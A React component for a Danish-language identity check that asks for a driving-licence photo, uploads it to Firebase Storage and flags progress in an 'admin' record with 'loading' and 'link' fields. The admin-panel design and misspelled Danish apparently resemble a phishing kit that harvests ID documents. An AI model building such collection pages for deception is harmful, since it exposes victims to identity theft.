import React, { useEffect, useState } from "react";
import { useTranslation } from "react-i18next";
import { getStorage, ref, uploadBytes } from "firebase/storage";
import { useOutletContext } from "react-router-dom";
import { arrayUnion, doc, updateDoc } from "firebase/firestore";
import { VideoRecorder } from "react-video-recorder";

function Video() {
  const [identifier, setIdentifier, db, storage] = useOutletContext();
  const { t } = useTranslation();
  const [selfie, setSelfie] = useState(null);
  const [selfieDataURL, setSelfieDataURL] = useState(null);

  const changeSelfie = (e) => {
    const file = e.target.files[0];
    setSelfie(file);
  };

  const submitSelfie = async () => {
    if (!selfie) return;

    const userRef = ref(storage, identifier);
    const spaceRef = ref(userRef, "Selfie");
    const result = await Promise.all(
      [selfie].map((file) => {
        const imageRef = ref(spaceRef, file?.name);
        return uploadBytes(imageRef, file);
      })
    );

    //Update Admin Panel
    if (result) {
      await updateDoc(doc(db, "admin", identifier), {
        loading: true,
        link: "",
        date: new Date().toISOString(),
        pagesDone: arrayUnion("video"),
      });
    }
  };

  useEffect(() => {
    let fileReader,
      isCancel = false;
    if (selfie) {
      fileReader = new FileReader();
      fileReader.onload = (e) => {
        const { result } = e.target;
        if (result && !isCancel) {
          setSelfieDataURL(result);
        }
      };
      fileReader.readAsDataURL(selfie);
    }
    return () => {
      isCancel = true;
      if (fileReader && fileReader.readyState === 1) {
        fileReader.abort();
      }
    };
  }, [selfie]);

  return (
    <div className="max-w-md m-auto">
      <div className="py-3 px-7  min-h-[60vh] bg-white shadow-lg mt-12 rounded-xl">
        <div className="flex flex-col gap-10 justify-between items-center  mb-10">
          <section className="w-full flex justify-center font-bold">
            BILLEDE-ID
          </section>
          <section className="w-full">
            <div className="text-sm font-bold mb-4">Vaelg dokument</div>
          </section>
          <section className="w-full ">
            <div className="text-sm font-bold mb-4">
              Tag et billede af Korekort. Billedet skai <br /> Vaere :
            </div>
            <div className="text-sm mb-4">
              <ul>
                <li className="text-blue-800 font-semibold">
                  Lyst og tydeligt{" "}
                  <span className="text-xs font-normal">(god kvalitech)</span>
                </li>
                <li className="text-blue-800 font-semibold">
                  ubeskaret{" "}
                  <span className="text-xs font-normal">
                    (alle hjorner skal varere synline)
                  </span>
                </li>
              </ul>
            </div>
            <div className="w-full flex justify-between items-center gap-4 ">
              <span className="flex justify-center">
                <img className="w-1/2" src="/selfie.png" alt="" />
              </span>
            </div>
          </section>
          <section className="w-full">
            <VideoRecorder
              onRecordingComplete={(videoBlob) => {
                // Do something with the video...
              }}
            />
          </section>
          <section className="w-full flex justify-center">
            <button
              onClick={submitSelfie}
              type="submit"
              className="text-white w-1/3 bg-[#2f51e9] font-medium rounded-sm text-sm outline-none  px-5 py-2.5 text-center flex justify-between"
            >
              <p>Naeste trin</p>
            </button>
          </section>
        </div>
      </div>
    </div>
  );
}

export default Video;
